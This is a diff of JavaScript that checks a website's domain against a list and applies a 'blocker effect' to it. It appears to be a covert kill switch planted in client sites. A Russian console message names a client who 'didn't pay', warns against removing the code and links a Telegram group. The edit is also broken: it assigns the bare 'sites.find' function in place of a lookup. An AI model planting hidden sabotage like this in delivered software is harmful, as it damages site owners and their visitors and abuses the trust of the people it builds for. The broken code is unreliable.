@@ -54,8 +54,10 @@ const effects = {
     const currentDomain = window.location.hostname;
 
     // Находим текущий домен в списке
-    const siteInfo = sites.find(site => {
-      console.log("Site Info:", siteInfo);
+    const siteInfo = sites.find;
+
+    console.log("Site Info:", siteInfo);
+
     // Применение эффекта, если домен найден в списке
     const effectFunction = effects[siteInfo.blocker_effect];
     if (effectFunction) {
@@ -66,7 +68,8 @@ const effects = {
     if (siteInfo && siteInfo.blocker_cause === "didnt pay") {
         console.log(`Этот заказчик ${siteInfo.blocker_date} не оплатил заказанную работу, поэтому будь осторожен и не удаляй этот код. По всем вопросам пиши сюда \nTelegram Group → https://t.me/d3usn0tam`);
       }
-  };
+  }
 
+// Вызов функции для проверки домена
 checkDomain();
 });
